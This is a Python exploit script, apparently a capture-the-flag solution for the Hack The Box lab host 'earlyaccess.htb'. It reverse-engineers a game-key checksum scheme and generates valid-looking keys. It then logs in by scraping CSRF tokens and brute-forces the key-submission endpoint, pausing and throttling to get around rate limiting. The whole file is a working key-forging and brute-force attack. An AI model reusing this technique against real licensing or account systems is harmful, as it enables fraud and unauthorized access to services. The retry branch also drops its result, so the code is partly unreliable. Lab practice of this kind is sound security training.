#!/usr/bin/env python3
import requests # To make web-requests
import sys # For input-verification
import argparse # For argument-parsing
from string import ascii_uppercase, digits
from itertools import product
from time import sleep, time
from bs4 import BeautifulSoup

# Ignore ssl-errors
import urllib3
urllib3.disable_warnings()

proxies = {} #{'https':'http://127.0.0.1:8080'}
# URL of webpage
url = "https://earlyaccess.htb"

def calc_checksum(key:str) -> int:
    """
    Returns checksum of given `key`
    """
    groups = key.split('-')[:-1] # Last one is checksum
    return sum([sum(bytearray(group.encode())) for group in groups])

def calc_g3(magic_num:int, known:str="XP") -> str:
    """
    Returns valid g3 candidates using `magic_num` (target sum) and `known` (known part of string)
    """
    if len(known) == 2:
        # Get value of the two remaining letters + num
        remain = magic_num - (ord("X") + ord("P"))
        for i in range(ord("0"), ord("9")+1):
            target = remain - i
            if target % 2 == 0:
                half = int(target / 2)
                if half > 64 and half < 91:
                    return f"XP{chr(half)}{chr(half)}{chr(i)}" 
            if (target - 65) > 64 and (target - 65) < 91:
                return f"XPA{chr(target-65)}{chr(i)}"
    else:
        # Get value of the three remaining letters + num
        remain = magic_num - ord("X")
        for i in range(ord("0"), ord("9")+1):
            target = remain - i
            if target % 3 == 0:
                third = int(target / 3)
                if third > 64 and third < 91:
                    return f"X{chr(third)}{chr(third)}{chr(third)}{chr(i)}" 
            if (target - 65) > 64 and (target - 65) < 91:
                target = target - 65
                if (target - 65) > 64 and (target - 65) < 91:
                    return f"X{chr(target-65)}{chr(target-65)}{chr(i)}"

def calc_key(magic_num:int=-1, known:str="XP") -> list:
    """
    Calculates remainder of key (g3) using `magic_num` (optional) and `known` (Default: XP)
    - `magic_num` -- Target sum of all chars in g3
    - `known`     -- Known part of Key's g3

    ...
    
    Returns a list of valid keys (of no `magic_num` is set) or returns one possible key for given `magic_num`
    """
    keys = []
    if magic_num == -1:
        if len(known) == 2:
            # Magic-num not set, so calc all possible keys
            for num in range(sum(bytearray(b"XPAA0")), sum(bytearray(b"XPZZ9"))+1):
                group3 = calc_g3(magic_num=num, known=known)
                key = f"KEY01-0H0H0-{group3}-GAME1-"
                checksum = calc_checksum(key)
                key += str(checksum)
                #print(f"Key for magic_num {num}: {key}")
                keys.append(key)
        else:
            # Magic-num not set, so calc all possible keys
            for num in range(sum(bytearray(b"XAAA0")), sum(bytearray(b"XZZZ9"))+1):
                group3 = calc_g3(num, known=known)
                key = f"KEY01-0H0H0-{group3}-GAME1-"
                checksum = calc_checksum(key)
                key += str(checksum)
                #print(f"Key for magic_num {num}: {key}")
                keys.append(key)
    else:
        group3 = calc_g3(magic_num, known=known)
        key = f"KEY01-0H0H0-{group3}-GAME1-"
        checksum = calc_checksum(key)
        key += str(checksum)
        keys.append(key)
    
    return keys

def gen_all_keys() -> list:
    """
    Bruteforces all possible keys (without considering duplicate values) [not-efficient]
    """
    keys = []
    values = ascii_uppercase
    possible = product(values, repeat=2)

    for group3 in possible:
        for i in range(0, 10):
            test = "XP" + "".join(group3) + str(i)
            key = f"KEY01-0H0H0-{test}-GAME1-"
            checksum = calc_checksum(key)
            key += str(checksum)
            keys.append(key)
    return keys  

def login(session:requests.Session, email:str, password:str) -> requests.Session:
    """
    Uses `email` and `password` to login and returns a valid `session`, if login was successful
    """
    res = session.get(f"{url}/login", proxies=proxies)
    soup = BeautifulSoup(res.text, features='lxml')
    token = soup.find('input',{'type':'hidden'}).attrs["value"]
    data = {'_token':token,'email':email, 'password':password}
    resp = session.post(f"{url}/login", proxies=proxies, data=data)
    return "dashboard" in resp.url

def submit_key(session:requests.Session, key:str) -> bool:
    """
    Uses `session` to submit a key and returns `True`, if the key successfully registered to the account
    """
    res = session.get(f"{url}/key", proxies=proxies)
    soup = BeautifulSoup(res.text, features='lxml')
    token = soup.find('input',{'type':'hidden'}).attrs["value"]
    data = {'_token':token, 'key':key}

    resp = session.post(f"{url}/key/add", data=data, proxies=proxies)
    soup = BeautifulSoup(resp.text, features='lxml')
    out = soup.find('div',{'class':'toast-body'})
    if out:
        out = out.text
    else:
        return False

    # Double check to limit false-positives
    #return "Game-key is invalid!" not in out and "Game-key successfully added!" in out
    if "Game-key successfully added" in out:
        return True
    elif "Game-key is invalid!" in out:
        return False
    elif "Too many requests!" in out:
        print(f"[!] Got blocked! Waiting 60 seconds and then retrying...")
        sleep(60)
        # Retry after 60 seconds
        submit_key(session, key)
    else:
        print(f"[!] Unexpected result: {out}")
        return False

def clear(count=1):
    for i in range(count):
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("--email", help="Email of your account", type=str)
    parser.add_argument("--password", help="Password of your account", type=str)
    parser.add_argument("-c", "--cookie", help="Cookie to use", type=str)
    parser.add_argument("-m", "--magic_num", help="Magic number to use", metavar="[346-406]", choices=range(346,405+1), type=int)
    parser.add_argument("-p", "--proxy", help="HTTP proxy", metavar="http://127.0.0.1:8080", type=str)
    parser.add_argument("-l", "--local", help="Only calculate key, do not submit", action='store_true')
    args = parser.parse_args()

    if args.local:
        """
        Calc checksum locally
        """
        if args.magic_num:
            magic_num = args.magic_num
        else:
            magic_num = -1
        print(calc_key(magic_num, known="XP"))
    else:
        if not (args.email and args.password) and not args.cookie:
            print("When not using --local either --email and --password or --cookie is required!")
            quit()
        
        session = requests.Session()
        session.verify = False

        if args.proxy:
            proxies = {'http':args.proxy, 'https':args.proxy}
    
        if args.cookie:
            session.cookies.set("earlyaccess_session",args.cookie,domain="earlyaccess.htb")
        else:
            email = args.email
            password = args.password

            if not login(session, email, password):
                print(f"[-] Could not login with creds: {email} - {password}!")
                quit()

        if args.magic_num:
            magic_num = args.magic_num
        else:
            magic_num = -1
        
        keys = calc_key(magic_num) #gen_all_keys() || calc_key()

        print(f"[*] Starting Brute-Force with {len(keys)} possible keys!\r\n")
        
        # Stop execution time
        start_time = time()
        for index, key in enumerate(keys, start=1):
            progress = index / len(keys) * 100

            if progress < 10:
                clear()
                print(f"[{progress:0.2f}%]  Trying key: {key}")
            else:
                clear()
                print(f"[{progress:0.2f}%] Trying key: {key}")
            if submit_key(session, key):
                clear()
                print(f"[+] Successfully registered valid key: {key} to account {email} after a total of {index} requests that took {time() - start_time:0.2f} seconds!")
                print(f"[INFO] Magic_num of the API currently is: {sum(bytearray(key.split('-')[2].encode()))}")
                quit()
            
            # Sleep 1 second between each request to not get blocked
            sleep(.5)
        
        print(f"[-] Could not find valid key! Please retry...")
